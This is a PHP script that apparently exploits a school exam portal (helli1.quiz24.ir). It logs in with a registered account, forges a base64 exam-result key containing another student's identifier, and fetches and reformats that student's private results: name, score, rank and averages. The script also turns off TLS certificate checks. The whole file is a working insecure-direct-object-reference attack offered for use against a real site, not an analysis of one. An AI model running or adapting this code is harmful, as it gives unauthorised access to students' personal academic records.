<?php


function find_std($name){
	$stdname = array();
  $a = $stdname[$name];
  return $a;
}


function get_str($string, $start, $end){
	$string = ' ' . $string;
	$ini = strpos($string, $start);
	if ($ini == 0) return '';
	$ini += strlen($start);
	$len = strpos($string, $end, $ini) - $ini;
	return substr($string, $ini, $len);
}


function is_base64($str){
	return (bool) preg_match('/^[a-zA-Z0-9\/\r\n+]*={0,2}$/', $str);
}


function exam_key($str){
	$str = base64_decode($str);
	return get_str($str, '|', '|');
}


function to_base64($targetname, $examkey){
	$str = "{$targetname}|{$examkey}|144";
	return base64_encode($str);
}


function to_json($str){
  header('Content-Type: application/json');
  $e = get_str($str, '{"header":{', ',"answerhseet":');
  $a1 = get_str($e, '"FullName":"', '","Major":"');
  $a2 = get_str($e, '"ExamTitle":"', '","OrientationTitle":');
  $a3 = get_str($e, '"TotalParticipation":', ',"TotalQuestion":');
  $a4 = get_str($e, '"TotalQuestion":', ',"CorrectCount":');
  $a5 = get_str($e, '"CorrectCount":', ',"WrongCount":');
  $a6 = get_str($e, '"WrongCount":', ',"NoAnswerCount":');
  $a7 = get_str($e, '"NoAnswerCount":', ',"Score":');
  $a8 = get_str($e, '"Score":', ',"BestScore":');
  $a9 = get_str($e, '"BestScore":', ',"Balance":');
  $a10 = get_str($e, '"Balance":', ',"TotalRank":');
  $a11 = get_str($e, '"TotalRank":', ',"SubDomain":');
  $a12 = get_str($e, '"RunDate":"', '","BestBalance":');
  $a13 = get_str($e, '","BestBalance":', ',"ShowRank":');
  $a14 = get_str($e, '"NoAnswerAvg":', ',"CorrectAvg":');
  $a15 = get_str($e, '"CorrectAvg":', ',"WrongAvg":');
  $a16 = get_str($e, '"WrongAvg":', ',"ScoreAvg":');
  $a17 = get_str($e, '"ScoreAvg":', ',"IsUni":');
  $a18 = get_str($e, '"First":"', '","Second":"');
  $a19 = get_str($e, '","Second":"', '","Third":"');
  $a20 = get_str($e, '","Third":"', '","Rank":');
  $obj = array(
      "عنوان آزمون" => $a2,
      "تاریخ آزمون" => $a12,
      "تعداد شرکت کنندگان" => $a3,
      "نام دانش آموز" => $a1,
      "تعداد سوالات" => $a4,
      "تعداد جواب درست" => $a5,
      "تعداد جواب نادرست" => $a6,
      "تعداد جواب بی پاسخ" => $a7,
      "درصد دانش آموز" => $a8,
      "تراز دانش آموز" => $a10,
      "رتبه کل" => $a11,
      "بهترین درصد" => $a9,
      "بهترین تراز" => $a13,
      "میانگین بی پاسخ ها" => $a14,
      "میانگین درست ها" => $a15,
      "میانگین نادرست ها" => $a16,
      "میانگین درصد ها" => $a17,
      "نفر اول" => $a18,
      "نفر دوم" => $a19,
      "نفر سوم" => $a20);
  echo json_encode($obj, JSON_UNESCAPED_UNICODE);
}


function get_header_cookie($username){
	$sessioni = ""; // For More Privacy Removed
	$rtoken = ""; // For More Privacy Removed
	$usercookie = "ASP.NET_SessionId={$sessioni} __RequestVerificationToken={$rtoken}";
	$header = array("Host: helli1.quiz24.ir", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0", "Accept: application/json, text/plain, */*", "Accept-Language: en-GB,en;q=0.5", "Origin: https://helli1.quiz24.ir", "Connection: keep-alive", "Referer: https://helli1.quiz24.ir/login", "Cookie: {$usercookie}", "Content-Length: 0");
	$url = 'https://helli1.quiz24.ir/account/login?jsonModel={"UserName":"' . $username . '","Password":"' . $username . '","UserType":2000,"RoleId":null,"SchoolId":null,"Agent":"Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:79.0)+Gecko/20100101+Firefox/79.0"}&returnUrl=';
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
	$res = curl_exec($ch);
	$usrc = get_str($res, 'userLoginData=', ';');
	$aspc = get_str($res, '.AspNet.ApplicationCookie=', ';');
	$last_cookie = $usercookie . ' userLoginData=' . $usrc . ';' . ' .AspNet.ApplicationCookie=' . $aspc;
	curl_close($ch);
	return $last_cookie;
}


function get_result($HCOOKIE, $ekey){
	$header = array("Accept: application/json, text/plain, */*", "Accept-Language: en-GB,en;q=0.5", "Connection: keep-alive", "Content-Length: 0", "Cookie: {$HCOOKIE}", "Host: helli1.quiz24.ir", "Origin: https://helli1.quiz24.ir", "Referer: https://helli1.quiz24.ir/student/exams", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0");
	$url = "https://helli1.quiz24.ir/student/GetExamResult?key={$ekey}";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
	$res = curl_exec($ch);
	curl_close($ch);
	return $res;
}


if(isset($_POST["btn"])){
	$wero = $_POST["your-key"];
	$name = $_POST["std-name"];
	if(is_base64($wero) == 1){
		$examkey = exam_key($wero);
		if($examkey != ''){
			$targetname = find_std($name);
      if($targetname == ''){
        header("Location: http://quiz24.rf.gd/404/");
      }
      else{
        $HCOOKIE = get_header_cookie('username'); // Enter A Registered User
        $ekey = to_base64($targetname, $examkey);
        $resp = get_result($HCOOKIE, $ekey);
        to_json($resp);
      }
		}
		else{
			header("Location: http://quiz24.rf.gd/404/");
		}
	}
	else{
		header("Location: http://quiz24.rf.gd/404/");
	}
}


?>
